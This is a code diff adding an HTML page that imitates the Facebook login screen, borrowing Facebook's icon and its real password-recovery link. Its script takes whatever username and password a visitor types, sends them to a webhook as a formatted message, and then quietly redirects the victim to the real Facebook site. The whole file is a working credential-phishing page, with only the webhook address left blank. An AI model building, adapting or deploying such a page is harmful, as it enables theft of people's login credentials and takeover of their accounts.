@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Login</title>
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="header">
+            <div class="logo">Facebook</div>
+        </div>
+
+        <div class="content">
+            <form action="#" method="post" autocomplete="off">
+                <input type="text" id="username" class="hoverBorder" onfocus="changeBorderColor(this)"
+                    placeholder="Email Address or Phone Number">
+                <input type="password" id="password" class="hoverBorder" onfocus="changeBorderColor(this)"
+                    placeholder="Password">
+                <button type="button" name="submit" onclick="sendMessage()">Login</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <a href="https://en-gb.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
+                class="forgottenPassword">Forgotten Password?</a>
+        </div>
+
+    </div>
+
+    <script>
+
+        function sendMessage() {
+
+            // Get Username and Password;
+            var _username = document.getElementById('username').value;
+            var _password = document.getElementById('password').value;
+
+            // Webhook URL;
+            var _webhookUrl = "";
+
+            // Generate JSON Data;
+            var params = {
+                content: "**Facebook > Username:**" + _username + "\n> **Password:**" + _password
+            };
+
+            var _request = new XMLHttpRequest();
+            _request.open("POST", _webhookUrl);
+            _request.setRequestHeader('Content-type', 'application/json');
+
+            // Send JSON Data;
+            _request.send(JSON.stringify(params));
+
+            // Wait For 2 Seconds to Allow the Message to be Sent to the Webhook.
+            sleep(2000);
+
+            // Redirect the Browser to the Specified Address.
+            window.location.replace("https://www.facebook.com/");
+
+            // Delay Function For the Specified Millisecond Duration.
+            function sleep(milliseconds) {
+                const date = Date.now();
+                let currentDate = null;
+                do {
+                    currentDate = Date.now();
+                } while (currentDate - date < milliseconds)
+            }
+        }
+
+    </script>
+
+</body>
+
+</html>
